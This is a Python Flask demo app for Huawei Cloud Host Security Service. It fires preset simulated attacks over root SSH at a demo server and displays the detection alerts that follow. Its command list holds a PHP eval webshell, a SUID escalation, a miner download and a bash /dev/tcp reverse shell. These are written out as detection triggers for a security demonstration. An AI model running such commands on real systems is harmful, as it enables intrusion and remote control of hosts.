#!/usr/bin/env python3
"""华为云 HSS 主机安全 Demo GUI —— 后端 + 动态架构图前端。"""
import json
import os
import re
import sys
import time
import warnings
warnings.filterwarnings("ignore")

SKILL_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, jsonify, request

import paramiko
from huaweicloudsdkcore.auth.credentials import BasicCredentials
from huaweicloudsdkecs.v2 import EcsClient, ShowServerRequest
from huaweicloudsdkhss.v5 import (HssClient, ListHostStatusRequest,
                                  ListSecurityEventsRequest)

CFG = json.load(open(os.path.join(SKILL_ROOT, "config.json"), encoding="utf-8"))
STATE = json.load(open(os.path.join(SKILL_ROOT, "state.json"), encoding="utf-8"))
AK, SK = CFG["ak"], CFG["sk"]
PID = CFG["project_id"]
REGION = CFG["region"]
HOST_ID = STATE["server_id"]
SERVER_ID = STATE["server_id"]
PUBLIC_IP = STATE["public_ip"]
PASSWORD = open(os.path.join(SKILL_ROOT, "demo_password.txt")).read().strip()

cred = BasicCredentials(AK, SK).with_project_id(PID)

PRESET_COMMANDS = [
    {"id": "suid", "name": "提权（SUID）", "badge": "提权", "reliable": True,
     "desc": "新建系统文件并设置 SUID 位 → HSS 检出「文件提权」",
     "cmd": 'f=/usr/bin/demo_$(date +%s%N); cp /bin/true "$f" && chmod u+s "$f" && echo "created $f"'},
    {"id": "webshell", "name": "Webshell 写入", "badge": "Webshell", "reliable": True,
     "desc": "写入 PHP 一句话木马 → HSS 检出「Webshell」",
     "cmd": 'f=/tmp/shell_$(date +%s%N).php; echo "<?php @eval(\\$_POST[c]);?>" > "$f" && echo "created $f"'},
    {"id": "miner", "name": "挖矿木马下载", "badge": "挖矿", "reliable": False,
     "desc": "模拟下载挖矿程序并赋执行权限 → HSS 检出「挖矿」",
     "cmd": 'f=/tmp/xmrig_$(date +%s%N); curl -s http://127.0.0.1/xmrig -o "$f"; chmod +x "$f"; echo "created $f"'},
    {"id": "revshell", "name": "反弹 Shell", "badge": "反弹Shell", "reliable": False,
     "desc": "反向连接 8.8.8.8 → HSS 检出「反弹Shell」",
     "cmd": 'timeout 5 bash -c "bash -i >& /dev/tcp/8.8.8.8/53 0>&1" 2>/dev/null; echo triggered'},
    {"id": "danger", "name": "危险命令（改权限）", "badge": "危险命令", "reliable": False,
     "desc": "对系统目录批量改权限 → HSS 检出「危险命令」",
     "cmd": 'mkdir -p /tmp/demo_$(date +%s%N) && chmod -R 777 /tmp/demo_$(date +%s%N) && echo done'},
]


def _ecs_client():
    return EcsClient.new_builder().with_credentials(cred).with_endpoint(
        f"https://ecs.{REGION}.myhuaweicloud.com").build()


def _hss_client():
    return HssClient.new_builder().with_credentials(cred).with_endpoint(
        f"https://hss.{REGION}.myhuaweicloud.com").build()


def _ssh_exec(cmd, timeout=40):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(PUBLIC_IP, username="root", password=PASSWORD, timeout=15,
              allow_agent=False, look_for_keys=False)
    try:
        i, o, e = c.exec_command(cmd, timeout=timeout)
        out = o.read().decode("utf-8", "replace").strip()
        err = e.read().decode("utf-8", "replace").strip()
        return out or err
    finally:
        c.close()


def _fmt_time(ms):
    try:
        return time.strftime("%H:%M:%S", time.localtime(int(ms) / 1000))
    except Exception:
        return str(ms)


app = Flask(__name__)


@app.route("/")
def index():
    return INDEX_HTML


@app.route("/api/status")
def api_status():
    try:
        ecs = _ecs_client().show_server(ShowServerRequest(server_id=SERVER_ID)).server
        ecs_status = ecs.status
    except Exception as e:
        ecs_status = f"ERR:{str(e)[:40]}"
    try:
        r = _hss_client().list_host_status(ListHostStatusRequest(limit=50, refresh=True))
        hss_info = {"version": None, "protect": "closed", "agent": "unknown"}
        for x in (r.data_list or []):
            if x.host_id == HOST_ID:
                hss_info = {"version": getattr(x, "version", None),
                            "protect": getattr(x, "protect_status", None),
                            "agent": getattr(x, "agent_status", None)}
                break
    except Exception as e:
        hss_info = {"error": str(e)[:60]}
    return jsonify({"host": {"name": "hss-demo-ecs", "ip": PUBLIC_IP, "status": ecs_status},
                    "hss": hss_info, "region": REGION})


@app.route("/api/commands")
def api_commands():
    return jsonify({"commands": PRESET_COMMANDS})


@app.route("/api/execute", methods=["POST"])
def api_execute():
    data = request.get_json(force=True, silent=True) or {}
    cid = data.get("id")
    cmd = next((c for c in PRESET_COMMANDS if c["id"] == cid), None)
    if not cmd:
        return jsonify({"ok": False, "error": "未知命令"}), 400
    try:
        out = _ssh_exec(cmd["cmd"])
        return jsonify({"ok": True, "output": out, "command": cmd["cmd"]})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)[:200]}), 500


@app.route("/api/events")
def api_events():
    try:
        r = _hss_client().list_security_events(ListSecurityEventsRequest(host_id=HOST_ID, limit=50))
        events = []
        for ev in (r.data_list or []):
            events.append({
                "name": getattr(ev, "event_name", None),
                "class": getattr(ev, "event_class_name", None) or getattr(ev, "event_type_name", None),
                "severity": getattr(ev, "severity", None),
                "time": _fmt_time(getattr(ev, "occur_time", None)),
                "ts": int(getattr(ev, "occur_time", 0) or 0),
            })
        events.sort(key=lambda e: e["ts"], reverse=True)
        return jsonify({"total": r.total_num or 0, "events": events})
    except Exception as e:
        return jsonify({"total": 0, "events": [], "error": str(e)[:200]})


INDEX_HTML = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>华为云 HSS 主机安全 Demo</title>
<style>
:root{--red:#C7000B;--red-dark:#9E0008;--red-light:#FDECEC;--red-lighter:#FFF4F4;--gray:#4A4A4A;--border:#f0c0c0;--blue:#2c6cb0;--amber:#d98200;--green:#1a9e3b;}
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;}
body{background:#f5f6f8;color:var(--gray);}
header{background:var(--red);color:#fff;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 12px rgba(199,0,11,.25);}
header h1{font-size:20px;font-weight:600;}
header .sub{font-size:12px;color:#ffd9db;margin-top:3px;}
.wrap{max-width:1320px;margin:0 auto;padding:16px 20px 40px;}
.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:14px;}
.card{background:#fff;border:1px solid var(--border);border-radius:10px;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;}
.card .k{font-size:12px;color:#999;}
.card .v{font-size:22px;font-weight:700;margin-top:4px;}
.card .v.green{color:var(--green);} .card .v.red{color:var(--red);}
.dot{width:10px;height:10px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(26,158,59,.5);animation:beacon 1.6s infinite;}
@keyframes beacon{0%{box-shadow:0 0 0 0 rgba(26,158,59,.5)}70%{box-shadow:0 0 0 10px rgba(26,158,59,0)}100%{box-shadow:0 0 0 0 rgba(26,158,59,0)}}
.stage{background:#fff;border:1px solid var(--border);border-radius:14px;padding:10px 16px 4px;margin-bottom:14px;position:relative;overflow:hidden;box-shadow:0 6px 24px rgba(0,0,0,.04);}
svg{width:100%;height:auto;display:block;}
.node{transition:all .35s ease;}
text{user-select:none;}
.dash{animation:dash 1s linear infinite;}
@keyframes dash{to{stroke-dashoffset:-24}}
.shake{animation:shake .55s;}
@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
#nHss.scanning rect{animation:scanPulse 1s infinite;}
@keyframes scanPulse{0%,100%{filter:drop-shadow(0 0 3px rgba(199,0,11,.45))}50%{filter:drop-shadow(0 0 16px rgba(199,0,11,1))}}
#nHss.detected rect{filter:drop-shadow(0 0 18px rgba(199,0,11,1));}
.cols{display:grid;grid-template-columns:420px 1fr;gap:16px;}
.panel{background:#fff;border:1px solid var(--border);border-radius:12px;overflow:hidden;}
.panel .hd{background:var(--red-light);color:var(--red-dark);font-weight:700;padding:11px 16px;font-size:14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;}
.panel .hd button{background:#fff;border:1px solid var(--red);color:var(--red);border-radius:6px;padding:3px 9px;font-size:12px;cursor:pointer;}
.cmd-row{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid #f5e5e5;transition:background .2s;}
.cmd-row:hover{background:var(--red-lighter);}
.cmd-row:last-child{border-bottom:none;}
.cmd-row .nm{font-weight:600;font-size:14px;}
.cmd-row .ds{font-size:12px;color:#999;margin-top:2px;}
.cmd-row .badge{display:inline-block;background:var(--red);color:#fff;font-size:10.5px;border-radius:4px;padding:2px 7px;margin-right:7px;}
.cmd-row .badge.soft{background:#e9b7b7;}
.fire{background:var(--red);color:#fff;border:none;border-radius:7px;padding:8px 14px;font-size:13px;cursor:pointer;white-space:nowrap;transition:all .2s;}
.fire:hover{background:var(--red-dark);transform:scale(1.05);}
.fire:disabled{background:#d9a0a4;cursor:not-allowed;transform:none;}
#feed{max-height:430px;overflow:auto;}
.ev{padding:12px 16px;border-bottom:1px solid #f5e5e5;display:flex;justify-content:space-between;align-items:flex-start;opacity:0;transform:translateY(8px);animation:slidein .45s forwards;}
@keyframes slidein{to{opacity:1;transform:translateY(0)}}
.ev .nm{font-weight:600;font-size:13px;}
.ev .cl{font-size:12px;color:#999;margin-top:2px;}
.sev{font-size:11px;font-weight:700;border-radius:4px;padding:2px 8px;white-space:nowrap;}
.sev.High{background:#ffe3e3;color:#c7000b;}
.sev.Medium{background:#fff2df;color:#d97b00;}
.sev.Low{background:#f0f0f0;color:#888;}
.empty{text-align:center;color:#bbb;padding:40px;font-size:13px;}
#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);background:#2b2b2b;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;display:none;z-index:99;box-shadow:0 4px 18px rgba(0,0,0,.25);}
@media(max-width:900px){.cols{grid-template-columns:1fr;}.cards{grid-template-columns:1fr 1fr;}}
</style>
</head>
<body>
<header>
  <div><h1>华为云 HSS 主机安全 Demo</h1><div class="sub">Huawei Cloud · Host Security Service — 攻击链动态演示</div></div>
  <div style="text-align:right;font-size:12px;color:#ffd9db;">区域：华北-北京四<br>计费：按需</div>
</header>
<div class="wrap">
  <div class="cards">
    <div class="card"><div><div class="k">主机状态</div><div class="v" id="c-host">-</div></div><div class="dot"></div></div>
    <div class="card"><div><div class="k">HSS 防护</div><div class="v green" id="c-protect">-</div></div><div class="dot"></div></div>
    <div class="card"><div><div class="k">HSS 版本</div><div class="v" id="c-version" style="font-size:15px;">-</div></div></div>
    <div class="card"><div><div class="k">安全事件（累计）</div><div class="v red" id="c-events">-</div></div></div>
  </div>

  <div class="stage">
    <svg viewBox="0 0 1000 430" id="arch">
      <defs>
        <pattern id="grid" width="26" height="26" patternUnits="userSpaceOnUse">
          <path d="M 26 0 L 0 0 0 26" fill="none" stroke="#f6e2e2" stroke-width="1"/>
        </pattern>
        <marker id="arrowRed" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
          <path d="M0,0 L0,6 L8,3 z" fill="#C7000B"/>
        </marker>
      </defs>
      <rect width="1000" height="430" fill="url(#grid)"/>

      <path id="pa1" d="M 156 205 L 288 205" stroke="#C7000B" stroke-width="2.5" stroke-dasharray="7 5" fill="none" marker-end="url(#arrowRed)" class="dash"/>
      <path id="pa2" d="M 452 205 L 530 205" stroke="#C7000B" stroke-width="2.5" stroke-dasharray="7 5" fill="none" marker-end="url(#arrowRed)" class="dash"/>
      <path id="pd" d="M 712 205 L 792 205" stroke="#C7000B" stroke-width="2.5" stroke-dasharray="7 5" fill="none" marker-end="url(#arrowRed)" class="dash" opacity="0.25"/>

      <g id="nAttacker" class="node">
        <circle cx="110" cy="205" r="46" fill="#2b2b2b"/>
        <text x="110" y="216" text-anchor="middle" font-size="28" fill="#fff">&#128128;</text>
        <text x="110" y="282" text-anchor="middle" font-size="13" fill="#444" font-weight="600">攻击者</text>
      </g>

      <g id="nBoundary" class="node">
        <rect x="288" y="150" width="164" height="110" rx="12" fill="#fff7e6" stroke="#d98200" stroke-width="2"/>
        <text x="370" y="180" text-anchor="middle" font-size="13" fill="#8a6a00" font-weight="600">公网 EIP + 安全组</text>
        <text x="370" y="206" text-anchor="middle" font-size="11" fill="#b58500">SSH 白名单 · 最小放行</text>
        <text x="370" y="228" text-anchor="middle" font-size="11" fill="#b58500" id="sg-ip">hss-demo-sg</text>
      </g>

      <g id="nEcs" class="node">
        <rect x="530" y="140" width="182" height="130" rx="12" fill="#eef4fd" stroke="#2c6cb0" stroke-width="2"/>
        <text x="621" y="170" text-anchor="middle" font-size="13" fill="#1e4f86" font-weight="600">ECS 主机</text>
        <text x="621" y="192" text-anchor="middle" font-size="11" fill="#3a6ea5" id="ecs-name">hss-demo-ecs</text>
        <text x="621" y="213" text-anchor="middle" font-size="11" fill="#3a6ea5">EulerOS 3.0 · 1核2GB</text>
        <g id="nAgent">
          <rect x="640" y="228" width="64" height="26" rx="8" fill="#C7000B"/>
          <text x="672" y="246" text-anchor="middle" font-size="11" fill="#fff">HSS Agent</text>
        </g>
      </g>

      <g id="nHss" class="node">
        <rect x="792" y="150" width="176" height="110" rx="12" fill="#C7000B"/>
        <text x="880" y="184" text-anchor="middle" font-size="14" fill="#fff" font-weight="700">HSS 安全中心</text>
        <text x="880" y="209" text-anchor="middle" font-size="11" fill="#ffd9db">企业版 · 按需</text>
        <text x="880" y="231" text-anchor="middle" font-size="11" fill="#ffd9db" id="hss-state">实时检测中</text>
      </g>

      <circle id="attackDot" cx="0" cy="0" r="7" fill="#C7000B" opacity="0"/>
      <circle id="detectDot" cx="0" cy="0" r="6" fill="#ff5252" opacity="0"/>

      <g id="alertBadge" opacity="0">
        <rect x="882" y="104" width="76" height="28" rx="14" fill="#C7000B"/>
        <text x="920" y="123" text-anchor="middle" font-size="12" fill="#fff" id="alertBadgeText">告警 +1</text>
      </g>
    </svg>
  </div>

  <div class="cols">
    <div class="panel">
      <div class="hd"><span>🛡 攻击模拟 · 点击触发</span></div>
      <div id="cmds"></div>
    </div>
    <div class="panel">
      <div class="hd"><span>🚨 HSS 检测告警（5 秒刷新）</span><button onclick="loadEvents(true)">立即刷新</button></div>
      <div id="feed"><div class="empty">加载中…</div></div>
    </div>
  </div>
</div>
<div id="toast"></div>
<script>
const $=id=>document.getElementById(id);
async function getJSON(u){const r=await fetch(u);return r.json();}
function toast(m){const t=$('toast');t.textContent=m;t.style.display='block';clearTimeout(t._x);t._x=setTimeout(()=>t.style.display='none',3200);}

async function loadStatus(){
  try{
    const s=await getJSON('/api/status');
    $('c-host').textContent=s.host.status;
    const p=s.hss.protect;
    $('c-protect').textContent=(p==='opened'?'已开启':p);
    $('c-protect').className='v '+(p==='opened'?'green':'red');
    $('c-version').textContent=(s.hss.version||'-').replace('hss.version.','');
    $('ecs-name').textContent=s.host.name;
  }catch(e){}
}

async function loadCommands(){
  try{
    const d=await getJSON('/api/commands');
    const box=$('cmds');box.innerHTML='';
    for(const c of d.commands){
      const div=document.createElement('div');
      div.className='cmd-row';
      div.innerHTML='<div><span class="badge'+(c.reliable?'':' soft')+'">'+c.badge+'</span><span class="nm">'+c.name+'</span><div class="ds">'+c.desc+'</div></div><button class="fire" data-id="'+c.id+'" data-name="'+c.name+'">触发</button>';
      box.appendChild(div);
    }
    document.querySelectorAll('button.fire').forEach(b=>b.onclick=()=>fire(b));
  }catch(e){}
}

function setDot(el,pt){el.setAttribute('cx',pt.x);el.setAttribute('cy',pt.y);}
function animateAlong(pathId,dot,dur){
  return new Promise(res=>{
    const path=$(pathId);const len=path.getTotalLength();const t0=performance.now();
    function step(t){
      const p=Math.min((t-t0)/dur,1);
      setDot(dot,path.getPointAtLength(p*len));
      if(p<1)requestAnimationFrame(step);else res();
    }
    requestAnimationFrame(step);
  });
}
function wait(ms){return new Promise(r=>setTimeout(r,ms));}

async function playAttackFlow(){
  const atk=$('nAttacker'),ecs=$('nEcs'),hss=$('nHss');
  const dot=$('attackDot'),ddot=$('detectDot');
  hss.classList.remove('scanning','detected');
  $('pd').setAttribute('opacity','0.25');
  $('hss-state').textContent='实时检测中';
  atk.classList.add('shake');setTimeout(()=>atk.classList.remove('shake'),620);
  dot.setAttribute('opacity','1');
  await animateAlong('pa1',dot,420);
  await animateAlong('pa2',dot,420);
  dot.setAttribute('opacity','0');
  ecs.classList.add('shake');setTimeout(()=>ecs.classList.remove('shake'),620);
  await wait(280);
  $('pd').setAttribute('opacity','1');
  ddot.setAttribute('opacity','1');
  await animateAlong('pd',ddot,520);
  ddot.setAttribute('opacity','0');
  hss.classList.add('scanning');
  $('hss-state').textContent='检测中…';
}

async function fire(btn){
  const id=btn.dataset.id;
  btn.disabled=true;btn.textContent='执行中…';
  playAttackFlow();
  try{await fetch('/api/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});}catch(e){}
  toast('已触发攻击，HSS 正在检测…');
  setTimeout(()=>{btn.disabled=false;btn.textContent='触发';},2600);
}

let lastTs=0,lastSig='';
async function loadEvents(animateNew){
  try{
    const d=await getJSON('/api/events');
    $('c-events').textContent=d.total||0;
    const evs=d.events||[];
    const newest=evs.length?Math.max(...evs.map(e=>e.ts||0)):0;
    const sig=(d.total||0)+'-'+newest;
    if(sig!==lastSig){
      const feed=$('feed');
      if(!evs.length){feed.innerHTML='<div class="empty">暂无告警 — 点击左侧「触发」模拟攻击</div>';}
      else{feed.innerHTML=evs.map(e=>'<div class="ev"><div><div class="nm">'+e.name+'</div><div class="cl">'+(e.class||'主机入侵')+' · '+e.time+'</div></div><span class="sev '+e.severity+'">'+e.severity+'</span></div>').join('');}
      lastSig=sig;
    }
    if(animateNew&&newest>lastTs){
      const hss=$('nHss');
      hss.classList.remove('scanning');hss.classList.add('detected');
      $('hss-state').textContent='已检出！';
      const badge=$('alertBadge');
      badge.setAttribute('opacity','1');
      setTimeout(()=>badge.setAttribute('opacity','0'),3200);
      toast('🚨 HSS 检出新的安全事件！');
    }
    lastTs=Math.max(lastTs,newest);
  }catch(e){}
}

loadStatus();loadCommands();loadEvents(false);
setInterval(loadStatus,10000);
setInterval(()=>loadEvents(true),5000);
</script>
</body>
</html>
"""

# 用 architecture-diagram-tool Skill 生成的官方图标架构图替换手绘 SVG
try:
    _ARCH = open(os.path.join(SKILL_ROOT, "assets", "arch_diagram.svg"), encoding="utf-8").read()
    INDEX_HTML = re.sub(r'<svg viewBox="0 0 1000 430" id="arch">.*?</svg>',
                        lambda m: _ARCH, INDEX_HTML, flags=re.S)
except Exception:
    pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    print(f"HSS Demo GUI running at http://127.0.0.1:{port}", flush=True)
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
